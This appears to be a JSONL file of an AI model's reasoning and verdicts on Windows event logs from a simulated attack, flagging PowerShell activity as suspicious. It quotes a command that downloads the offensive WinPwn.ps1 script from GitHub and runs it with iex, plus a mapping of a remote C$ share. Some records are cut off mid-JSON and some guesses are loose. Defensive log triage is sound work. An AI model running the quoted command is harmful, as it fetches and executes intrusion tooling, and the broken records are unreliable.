{"file":"data\/attack\/20250606_143816.jsonl","analysis":"<think>\nOkay, let's take a look at these logs. The user wants to know if this batch is interesting for investigation. So, first, I need to scan through all the events and see if there's anything suspicious.\n\nStarting with the first entry: powershell.exe with a ProcessAccess event. Not too bad, but then there's a whoami.exe process created. That's a normal command to check user privileges, maybe part of a legitimate script. But then another powershell.exe with a ProcessAccess again. Then a Registry value set event. Still not too concerning on its own.\n\nWait, here's a key entry: the fifth log shows a powershell.exe process with a command line that's downloading a script from a GitHub URL. The URL is raw.githubusercontent.com, which is common for hosting scripts, but the path includes \"WinPwn.ps1\" which sounds like a malicious script. The command uses \"iex\" which is Invoke-Expression, a common method for executing PowerShell scripts from strings. That's a red flag. Even if it's a legitimate script, the use of this method can be abused by attackers.\n\nThen there are several ImageLoad events for various DLLs, including some from .NET and Windows Defender. That might be normal, but when combined with the PowerShell activity, it could indicate that the script is interacting with the system in a way that's not typical. Also, the creation and deletion of temporary files in the AppData directory is common, but when paired with the download and execution of a script, it's suspicious.\n\nAnother point is the FileCreate and FileDelete events for the temporary PowerShell script. The script is created and then immediately deleted, which might be an attempt to hide evidence. Also, the presence of multiple ImageLoad events for different DLLs might indicate that the PowerShell process is loading additional components, possibly for malicious purposes.\n\nThe Registry value set event could be part of configuring something, but without more context, it's hard to tell. However, combined with the other events, it's part of a pattern that's often seen in attacks.\n\nSo, putting it all together: the download of a script from a GitHub repo using a method that's commonly used in attacks, along with multiple process accesses and image loads, suggests that this might be a malicious activity. The confidence is high because the combination of these events points to a possible compromise. Even though some elements could be legitimate, the overall pattern is concerning.\n<\/think>\n\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"Multiple PowerShell processes accessing system resources, including a suspicious command-line that downloads and executes a script from a GitHub repository (WinPwn.ps1).

So, first, I need to go through each event and see if there's anything suspicious.\n\nStarting with the first entry: svchost.exe setting a registry value. That's normal, as svchost is a system process. Then sppsvc.exe creating a file in the System32\\spp\\store directory. That seems okay too; sppsvc is related to software protection, and cache files are common there.\n\nNext, there's a lot of activity with powershell.exe. Multiple entries show Process Accessed, Image Loaded, File Created, and even a Pipe Created. The command line in one of the entries stands out: \"New-PSDrive -name g -psprovider filesystem -unidade_auxiliar \\\\Target\\\\C$\". Wait, \"unidade_auxiliar\" is Portuguese for \"auxiliary unit,\" which might be a red flag. The command is trying to map a network drive, possibly to access another machine's C$ share, which is a common technique in attacks to access remote systems.\n\nAlso, there's a file created in the Temp directory named __PSScriptPolicyTest_ppfs3is3.jnx.ps1, then immediately deleted. That could be part of a script execution attempt, which is suspicious. The PowerShell process loading various DLLs, including those from the .NET Framework and Windows Defender, might be normal, but the combination with the network drive mapping and temporary file creation\/deletion is concerning.\n\nThe presence of multiple Image Load events for PowerShell might indicate that the process is executing multiple commands or scripts. The Pipe Created event could be used for inter-process communication, which might be benign but in context with other events, it's worth looking into.\n\nConsidering all these points, the repeated PowerShell activities, the network drive mapping, and the temporary file creation\/deletion suggest potential malicious behavior. Even though some processes are legitimate, the combination here is suspicious enough to warrant further investigation.\n<\/think>\n\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"Multiple PowerShell.exe activities including suspicious command-line execution (mapping network drive to \\\\Target\\\\C$), temporary file creation\/deletion, and frequent image loads.

{"file":"data\/attack\/20250606_143816.jsonl","analysis":"<think>\nOkay, let's take a look at these logs. The first entry has \"process\" as None and \"winlog\" task as None. That might just be a placeholder or an error, but not sure yet. Then, starting from the second entry, there are multiple entries with the same process command line. The command line is using PowerShell to download a script from a GitHub repository. The URL is https:\/\/raw.githubusercontent.com\/S3cur3Th1sSh1t\/WinPwn\/...\/WinPwn.ps1. That seems suspicious because downloading scripts from external sources, especially with commands like iex (Invoke-Expression) is a common indicator of malicious activity.\n\nLooking further, the same command is repeated multiple times, which could indicate that this process is being executed repeatedly, maybe trying to maintain persistence or execute multiple commands. Also, the script name \"WinPwn.ps1\" sounds like it could be a payload or a tool used for exploitation.\n\nThen, there are other process entries with command lines that use New-PSDrive to create a new PSDrive pointing to \\\\Target\\\\C$. This is likely an attempt to map a network share or access a remote system's file system, which is another red flag. The repetition of these commands across multiple log entries suggests that this isn't a one-off event but part of a larger attack.\n\nThe winlog tasks are mostly \"Provider Lifecycle\" and \"Engine Lifecycle\", which might relate to the PowerShell provider or engine activities. The fact that these events are logged multiple times with the same command lines indicates potential malicious behavior. The combination of downloading a script from an external source, executing it with iex, and mapping network drives are all signs of a possible cyber attack, such as a phishing attempt, remote code execution, or lateral movement within a network.\n\nI should also check if the GitHub repository mentioned is legitimate. The username \"S3cur3Th1sSh1t\" might be a typo or a fake name. If the repository is not publicly accessible or is known for malicious content, that would confirm the suspicion. However, since I can't access external links, I have to rely on the command structure and repetition.\n\nIn conclusion, the multiple repeated PowerShell commands downloading and executing a script, along with creating network drives, are strong indicators of malicious activity. The logs should be investigated further to determine the scope of the attack and take necessary security measures.\n<\/think>\n\nThe provided logs indicate **potential malicious activity** based on the following suspicious patterns:\n\n---\n\n### **1. Repeated PowerShell Script Execution from External Source**\n- **Command Line Example:**\n  ```powershell\n  powershell.exe & {iex (new-object net.webclient).downloadstring('https:\/\/raw.githubusercontent.com\/S3cur3Th1sSh1t\/WinPwn\/...\/WinPwn.ps1')}\n  ```\n- **Indicators of Compromise (IoCs):**\n  - **Download and Execution of External Script:** The use of `iex` (Invoke-Expression) to execute a script downloaded from a GitHub repository (`WinPwn.ps1`) is a **common technique in PowerShell-based attacks**.\n  - **Suspicious Repository Name:** The GitHub username `S3cur3Th1sSh1t` (likely a typo or obfuscated name) and repository name `WinPwn` (suggesting \"Windows Pwn\") are **highly suspicious** and may be associated with malicious payloads.\n  - **Repetition:** The same command is logged **multiple times**, indicating **persistence attempts** or repeated execution of the payload.\n\n---\n\n### **2. Network Drive Mapping for Lateral Movement**\n- **Command Line Example:**\n  ```powershell\n  powershell.exe & {New-PSDrive -name g -psprovider filesystem -unidade_auxiliar \\\\Target\\\\C$}\n  ```\n- **Indicators of Compromise (IoCs):**\n  - **Mapping Remote Shares:** The use of `New-PSDrive` to map a network share (`\\\\Target\\\\C$`) suggests **lateral movement** within a network, potentially to access files on another system.\n  - **Repetition:** This command is also repeated **multiple times**, indicating **persistent access attempts** or automation of the attack.\n\n---\n\n### **3. PowerShell Provider\/Engine Lifecycle Events**\n- **Winlog Task:** Multiple entries reference **\"Provider Lifecycle\"** and **\"Engine Lifecycle\"** tasks, which are associated with **PowerShell provider activities** (e.g., interacting with file systems, registry, or remote shares).\n- **Implication:** These logs likely capture **PowerShell-based attacks** (e.g., exploitation, persistence, or data exfiltration).\n\n---\n\n### **Threat Assessment**\n- **Likely Attack Type:** \n  - **Remote Code Execution (RCE)** via PowerShell.\n  - **Lateral Movement** through network shares.\n  - **Persistence** via repeated execution of malicious scripts.\n- **Severity:** **High** – This behavior aligns with **post-exploitation activities** in advanced persistent threats (APTs) or phishing attacks.\n\n---\n\n### **Recommended Actions**\n1. **Block the GitHub URL:** Add the malicious script URL to a **web filter** or **firewall rule** to prevent further downloads.\n2. **Investigate the Script:** Analyze the contents of `WinPwn.ps1` (if accessible) for malicious code (e.g., data exfiltration, privilege escalation).\n3. **Isolate Affected Systems:** Quarantine any systems where this activity was detected.\n4. **Check for Lateral Movement:** Investigate the `\\\\Target\\\\C$` share for unauthorized access or data breaches.\n5. **Enable PowerShell Logging:** Monitor PowerShell activity via **PowerShell Transcript Logging** or **Event Viewer** logs (`Microsoft-Windows-PowerShell\/Operational`).\n\n---\n\n### **Conclusion**\nThe logs strongly suggest **malicious activity** involving **PowerShell-based attacks** and **lateral movement**. Immediate investigation and mitigation are required to prevent further compromise."}
{"file":"data\/attack\/20250606_143816.jsonl","analysis":"<think>\nOkay, let me analyze this batch of events. The first event has a process command line that uses PowerShell to create a new PSDrive pointing to \\\\Target\\\\C$. This looks suspicious because creating a drive mapping to a remote machine's C$ share could be part of an attack, like accessing files or preparing for further actions. The task here is 'Engine Lifecycle', which might be a benign process, but combined with the PowerShell command, it's a red flag.\n\nThe rest of the events are all 'Execute a Remote Command' tasks with no process or file information. While multiple remote command executions could indicate automated tools or scripts, without more context, they might not be inherently malicious. However, the first event's PowerShell activity combined with these remote commands suggests a possible coordinated attack. The repetition of 'Execute a Remote Command' might indicate an attacker trying to execute multiple commands on the target system, possibly for data exfiltration or lateral movement.\n\nBut I need to check if there's enough evidence. The first event is notable, but the others are just remote command executions. Without additional details like specific commands, user context, or success\/failure statuses, it's hard to be certain. However, the presence of a suspicious PowerShell command alongside multiple remote executions increases the likelihood of malicious activity. The confidence isn't 100% because some of these could be legitimate, but the combination makes it worth investigating. So, I'd classify this as INTERESTING with a confidence around 0.75.\n<\/think>\n\n{\n  \"CLASSIFICATION\": \"INTERESTING\",\n  \"JUSTIFICATION\": \"The first event shows PowerShell creating a remote drive mapping to \\\\Target\\\\C$ (a common attack pattern for lateral movement).
